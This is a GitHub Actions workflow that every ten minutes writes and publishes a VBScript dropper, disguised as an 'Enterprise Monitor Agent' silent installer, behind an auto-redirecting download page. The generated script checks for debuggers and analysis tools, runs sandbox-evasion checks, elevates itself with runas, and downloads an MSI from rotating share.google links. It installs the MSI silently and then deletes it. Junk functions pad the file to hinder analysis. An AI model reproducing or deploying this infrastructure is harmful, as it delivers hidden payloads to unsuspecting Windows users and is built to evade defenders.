name: Update VBS

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Bulky VBS file
      run: |
        # Define your links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 10))
        current_link=${links[$link_index]}
        
        echo "Creating bulky VBS with link: $current_link"
        
        # Create a bulky VBS with lots of junk code using echo commands
        echo "' --------------------------------------------------------------------------" > yam.vbs
        echo "'  Silent Installer - Enterprise Monitor Agent" >> yam.vbs
        echo "' --------------------------------------------------------------------------" >> yam.vbs
        echo "Option Explicit" >> yam.vbs
        echo "" >> yam.vbs
        echo "' System initialization variables" >> yam.vbs
        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> yam.vbs
        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> yam.vbs
        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Anti-analysis dummy variables" >> yam.vbs
        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> yam.vbs
        echo "dummy1 = \"System initialization\"" >> yam.vbs
        echo "dummy2 = \"Network configuration\"" >> yam.vbs
        echo "dummy3 = \"Security validation\"" >> yam.vbs
        echo "dummy4 = \"Performance monitoring\"" >> yam.vbs
        echo "dummy5 = \"Error reporting\"" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Fake system information collection" >> yam.vbs
        echo "Function GetSystemInfo()" >> yam.vbs
        echo "    Dim result" >> yam.vbs
        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> yam.vbs
        echo "    GetSystemInfo = result" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Process validation function" >> yam.vbs
        echo "Function ValidateProcess(processName)" >> yam.vbs
        echo "    Dim colProcesses, objProcess" >> yam.vbs
        echo "    On Error Resume Next" >> yam.vbs
        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> yam.vbs
        echo "    " >> yam.vbs
        echo "    ValidateProcess = False" >> yam.vbs
        echo "    For Each objProcess in colProcesses" >> yam.vbs
        echo "        ValidateProcess = True" >> yam.vbs
        echo "        Exit For" >> yam.vbs
        echo "    Next" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Network adapter information" >> yam.vbs
        echo "Function GetNetworkInfo()" >> yam.vbs
        echo "    Dim result" >> yam.vbs
        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> yam.vbs
        echo "    GetNetworkInfo = result" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Registry operations helper" >> yam.vbs
        echo "Function ReadRegKey(keyPath, valueName)" >> yam.vbs
        echo "    On Error Resume Next" >> yam.vbs
        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> yam.vbs
        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Write registry value" >> yam.vbs
        echo "Sub WriteRegKey(keyPath, valueName, value)" >> yam.vbs
        echo "    On Error Resume Next" >> yam.vbs
        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> yam.vbs
        echo "End Sub" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Encryption helper function" >> yam.vbs
        echo "Function SimpleEncrypt(text)" >> yam.vbs
        echo "    Dim i, result" >> yam.vbs
        echo "    result = \"\"" >> yam.vbs
        echo "    For i = 1 To Len(text)" >> yam.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
        echo "    Next" >> yam.vbs
        echo "    SimpleEncrypt = result" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Decryption helper function" >> yam.vbs
        echo "Function SimpleDecrypt(text)" >> yam.vbs
        echo "    Dim i, result" >> yam.vbs
        echo "    result = \"\"" >> yam.vbs
        echo "    For i = 1 To Len(text)" >> yam.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
        echo "    Next" >> yam.vbs
        echo "    SimpleDecrypt = result" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Check for debugger processes" >> yam.vbs
        echo "Function IsDebuggerPresent()" >> yam.vbs
        echo "    Dim debuggers, proc" >> yam.vbs
        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> yam.vbs
        echo "    " >> yam.vbs
        echo "    IsDebuggerPresent = False" >> yam.vbs
        echo "    For Each proc In debuggers" >> yam.vbs
        echo "        If ValidateProcess(proc) Then" >> yam.vbs
        echo "            IsDebuggerPresent = True" >> yam.vbs
        echo "            Exit For" >> yam.vbs
        echo "        End If" >> yam.vbs
        echo "    Next" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Anti-sandbox time delay" >> yam.vbs
        echo "Sub AntiSandboxDelay()" >> yam.vbs
        echo "    Dim startTime, endTime" >> yam.vbs
        echo "    startTime = Timer" >> yam.vbs
        echo "    endTime = startTime + 30 ' 30 second delay" >> yam.vbs
        echo "    " >> yam.vbs
        echo "    Do While Timer < endTime" >> yam.vbs
        echo "        ' Do nothing - just waste time" >> yam.vbs
        echo "        Dim dummy" >> yam.vbs
        echo "        dummy = dummy & \"x\"" >> yam.vbs
        echo "    Loop" >> yam.vbs
        echo "End Sub" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Check for mouse activity (sandbox detection)" >> yam.vbs
        echo "Function HasMouseActivity()" >> yam.vbs
        echo "    On Error Resume Next" >> yam.vbs
        echo "    Dim objShell" >> yam.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
        echo "    " >> yam.vbs
        echo "    ' Get mouse position twice with a small delay" >> yam.vbs
        echo "    Dim pos1, pos2" >> yam.vbs
        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> yam.vbs
        echo "    WScript.Sleep 1000" >> yam.vbs
        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> yam.vbs
        echo "    " >> yam.vbs
        echo "    ' If positions are the same, likely a sandbox" >> yam.vbs
        echo "    HasMouseActivity = (pos1 <> pos2)" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' More junk functions to add bulk" >> yam.vbs
        echo "Function FakeFunction1()" >> yam.vbs
        echo "    FakeFunction1 = \"Fake result 1\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "Function FakeFunction2()" >> yam.vbs
        echo "    FakeFunction2 = \"Fake result 2\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "Function FakeFunction3()" >> yam.vbs
        echo "    FakeFunction3 = \"Fake result 3\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "Function FakeFunction4()" >> yam.vbs
        echo "    FakeFunction4 = \"Fake result 4\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "Function FakeFunction5()" >> yam.vbs
        echo "    FakeFunction5 = \"Fake result 5\"" >> yam.vbs
        echo "End Function" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Main execution starts here" >> yam.vbs
        echo "' Anti-analysis checks" >> yam.vbs
        echo "If IsDebuggerPresent() Then WScript.Quit" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Time-based anti-sandbox" >> yam.vbs
        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Check for user activity" >> yam.vbs
        echo "If Not HasMouseActivity() Then WScript.Quit" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Additional delay to frustrate analysis" >> yam.vbs
        echo "AntiSandboxDelay" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Core functionality - download and execute" >> yam.vbs
        echo "' Check for elevation" >> yam.vbs
        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> yam.vbs
        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> yam.vbs
        echo "    WScript.Quit" >> yam.vbs
        echo "End If" >> yam.vbs
        echo "" >> yam.vbs
        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> yam.vbs
        echo "strUrl = \"$current_link\"" >> yam.vbs
        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> yam.vbs
        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Download with redirect handling" >> yam.vbs
        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> yam.vbs
        echo "objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
        echo "objXMLHTTP.send()" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Check for any redirect (301, 302, etc.)" >> yam.vbs
        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> yam.vbs
        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> yam.vbs
        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
        echo "    objXMLHTTP.send()" >> yam.vbs
        echo "End If" >> yam.vbs
        echo "" >> yam.vbs
        echo "If objXMLHTTP.Status = 200 Then" >> yam.vbs
        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> yam.vbs
        echo "    objADOStream.Open" >> yam.vbs
        echo "    objADOStream.Type = 1 ' Binary" >> yam.vbs
        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> yam.vbs
        echo "    objADOStream.Position = 0" >> yam.vbs
        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> yam.vbs
        echo "    objADOStream.Close" >> yam.vbs
        echo "" >> yam.vbs
        echo "    ' Install" >> yam.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> yam.vbs
        echo "" >> yam.vbs
        echo "    ' Cleanup" >> yam.vbs
        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> yam.vbs
        echo "End If" >> yam.vbs
        echo "" >> yam.vbs
        echo "' Final cleanup" >> yam.vbs
        echo "Set WshShell = Nothing" >> yam.vbs
        echo "Set Fso = Nothing" >> yam.vbs
        echo "Set NetObj = Nothing" >> yam.vbs
        echo "Set EnvVars = Nothing"
        
        # Create index.html for GitHub Pages
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=yam.vbs"></head><body><p>If not redirected, <a href="yam.vbs">click here</a></p></body></html>' > index.html
        
        # Commit and push the updated files
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add yam.vbs index.html
        git commit -m "Update bulky VBS with current link" || exit 0
        git push
        
        echo "Bulky VBS file created successfully"
